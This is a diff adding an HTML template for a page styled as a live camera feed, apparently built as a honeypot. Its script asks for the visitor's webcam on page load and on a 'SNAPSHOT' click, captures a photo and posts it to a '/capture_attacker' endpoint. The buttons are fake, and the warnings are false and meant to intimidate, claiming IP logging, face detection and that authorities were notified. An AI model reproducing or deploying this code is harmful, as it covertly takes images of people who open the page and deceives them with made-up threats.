@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>{{ camera.name }} - Live Feed</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Courier New', monospace;
+        }
+        
+        body {
+            background: #0a0a0a;
+            color: #00ff00;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding: 10px;
+            background: #1a1a1a;
+            border: 1px solid #00ff00;
+        }
+        
+        .back-btn {
+            color: #00ff00;
+            text-decoration: none;
+            border: 1px solid #00ff00;
+            padding: 5px 10px;
+        }
+        
+        .back-btn:hover {
+            background: #00ff00;
+            color: #000;
+        }
+        
+        .camera-container {
+            background: #1a1a1a;
+            border: 1px solid #00ff00;
+            padding: 20px;
+        }
+        
+        .camera-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+        }
+        
+        .camera-name {
+            font-size: 20px;
+            font-weight: bold;
+        }
+        
+        .camera-status {
+            color: #0f0;
+        }
+        
+        .live-feed {
+            width: 100%;
+            background: #000;
+            border: 1px solid #00ff00;
+        }
+        
+        .live-feed img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+        
+        .camera-info {
+            margin-top: 20px;
+            padding: 10px;
+            background: #000;
+            border: 1px solid #00ff00;
+        }
+        
+        .info-row {
+            display: flex;
+            margin: 5px 0;
+            font-size: 14px;
+        }
+        
+        .info-label {
+            width: 120px;
+            color: #0a0;
+        }
+        
+        .info-value {
+            color: #0f0;
+        }
+        
+        .control-panel {
+            margin-top: 20px;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
+            gap: 10px;
+        }
+        
+        .control-btn {
+            background: #1a1a1a;
+            border: 1px solid #00ff00;
+            color: #00ff00;
+            padding: 10px;
+            cursor: pointer;
+            font-size: 12px;
+        }
+        
+        .control-btn:hover {
+            background: #00ff00;
+            color: #000;
+        }
+        
+        .warning {
+            color: #ff0;
+            margin-top: 10px;
+            padding: 10px;
+            border: 1px solid #ff0;
+            text-align: center;
+            animation: blink 1s infinite;
+        }
+        
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <a href="/" class="back-btn">← BACK TO DASHBOARD</a>
+            <div>LIVE FEED • {{ camera.name }}</div>
+        </div>
+        
+        <div class="camera-container">
+            <div class="camera-header">
+                <span class="camera-name">📹 {{ camera.name }}</span>
+                <span class="camera-status">● LIVE</span>
+            </div>
+            
+            <div class="live-feed">
+                <img src="/camera_feed/{{ camera.id }}" alt="Live Feed" id="liveFeed">
+            </div>
+            
+            <div class="camera-info">
+                <div class="info-row">
+                    <span class="info-label">Location:</span>
+                    <span class="info-value">{{ camera.location }}</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Status:</span>
+                    <span class="info-value">Motion Detected</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Last Motion:</span>
+                    <span class="info-value" id="motionTime">Just now</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Resolution:</span>
+                    <span class="info-value">640x480</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Format:</span>
+                    <span class="info-value">H.264</span>
+                </div>
+            </div>
+            
+            <div class="control-panel">
+                <button class="control-btn" onclick="takeSnapshot()">📸 SNAPSHOT</button>
+                <button class="control-btn" onclick="toggleAudio()">🔊 AUDIO</button>
+                <button class="control-btn" onclick="toggleRecording()">⏺️ RECORD</button>
+                <button class="control-btn" onclick="panLeft()">◀ PAN</button>
+                <button class="control-btn" onclick="panRight()">PAN ▶</button>
+                <button class="control-btn" onclick="zoomIn()">🔍 ZOOM+</button>
+            </div>
+            
+            <div class="warning" id="warning">
+                ⚠️ WARNING: Unauthorized access detected. Your IP has been logged.
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // Refresh feed every second
+        setInterval(() => {
+            document.getElementById('liveFeed').src = '/camera_feed/{{ camera.id }}?t=' + new Date().getTime();
+        }, 1000);
+        
+        // Fake controls (they don't actually work - it's a honeypot!)
+        function takeSnapshot() {
+            alert('📸 Snapshot saved to server (and your photo was captured!)');
+            captureAttacker();
+        }
+        
+        function toggleAudio() {
+            alert('🔊 Audio feed accessed - recording started');
+        }
+        
+        function toggleRecording() {
+            alert('⏺️ Recording started - evidence being saved');
+        }
+        
+        function panLeft() {
+            document.getElementById('warning').innerHTML = '⚠️ Camera movement detected - tracking your location';
+        }
+        
+        function panRight() {
+            document.getElementById('warning').innerHTML = '⚠️ Movement logged - authorities notified';
+        }
+        
+        function zoomIn() {
+            document.getElementById('warning').innerHTML = '⚠️ Zooming in on intruder - face detected';
+        }
+        
+        // Update motion time
+        setInterval(() => {
+            document.getElementById('motionTime').textContent = 'Motion detected ' + Math.floor(Math.random() * 10) + ' seconds ago';
+        }, 5000);
+        
+        // Capture attacker photo
+        async function captureAttacker() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                
+                await new Promise(r => setTimeout(r, 1000));
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                const photoData = canvas.toDataURL('image/jpeg');
+                
+                await fetch('/capture_attacker', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ photo: photoData })
+                });
+                
+                stream.getTracks().forEach(track => track.stop());
+                
+                document.getElementById('warning').innerHTML = '📸 PHOTO CAPTURED! Say cheese!';
+                
+            } catch (err) {
+                console.log('Camera access denied');
+            }
+        }
+        
+        // Try to capture immediately
+        setTimeout(captureAttacker, 2000);
+    </script>
+</body>
+</html>
